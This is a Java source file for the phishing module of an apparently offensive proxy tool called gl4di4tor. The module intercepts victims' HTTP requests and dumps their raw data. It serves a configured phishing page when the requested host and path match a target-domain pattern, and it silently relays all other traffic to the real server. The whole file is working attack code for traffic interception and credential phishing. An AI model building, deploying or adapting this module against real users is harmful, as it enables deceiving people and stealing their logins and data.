package gl4di4tor.module.phishing;

import gl4di4tor.configuration.Config;
import gl4di4tor.log.LogService;
import gl4di4tor.module.BaseModule;
import gl4di4tor.net.OutgoingChannel;
import gl4di4tor.net.http.HttpRequest;
import gl4di4tor.net.http.HttpResponseMaker;

import java.io.DataOutputStream;
import java.net.Socket;
import java.nio.file.NoSuchFileException;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Created by gladiator on 7/30/17.
 */
public class PhishingModule extends BaseModule {

    public PhishingModule(Socket socket) {
        super(socket);
    }

    @Override
    public void execute() {
        HttpRequest httpRequest = null;
        byte[] socketData = new byte[32768];
        int dataLen = 0;
        try {
            dataLen = readData(socketData);
            dumpData(socketData);
            httpRequest = new HttpRequest(new String(socketData));
        } catch (Exception ex) {
            //ignore me;
        }

        if (httpRequest == null) {
            return;
        }

        if (httpRequest != null && !isTargetDomain(httpRequest)) {
            new OutgoingChannel(httpRequest.getHeaderParam("Host"), this.socket, socketData, dataLen,
                    OutgoingChannel.ChannelMode.NON_BLOCKING).execute();
            return;
        }

        try {
            DataOutputStream out = new DataOutputStream(this.socket.getOutputStream());

            out.writeUTF(HttpResponseMaker.makeHttpResponse(Config.getInstance().getPhishingPage()));
            out.flush();
            this.socket.close();
        } catch (NoSuchFileException e) {
            try {
                LogService.error(Config.getInstance().getDefacePage() + " not find.");
            } catch (Exception ex) {
                LogService.error(ex);
            }
        } catch (Exception e) {
            LogService.error(e);
        }
    }

    @Override
    public void run() {
        try {
            LogService.info("Phishing attack launch for " + this.socket.getRemoteSocketAddress() + " using phishing page : " +
                    Config.getInstance().getPhishingPage());
        } catch (Exception e) {
            LogService.error(e);
        }
        execute();
    }

    private boolean isTargetDomain(HttpRequest request) {
        try {
            Pattern pattern = Pattern.compile(Config.getInstance().getPhishingTargetDomain());
            LogService.debug("Matching target domain [" + Config.getInstance().getPhishingTargetDomain() + "] " +
                    "with request domain [" + request.getHeaderParam("Host") + request.getUri() + "]");
            Matcher matcher = pattern.matcher(request.getHeaderParam("Host") + request.getUri());
            if (matcher.find()) {
                return true;
            }
        } catch (Exception e) {
            LogService.error(e);
        }
        return false;
    }
}
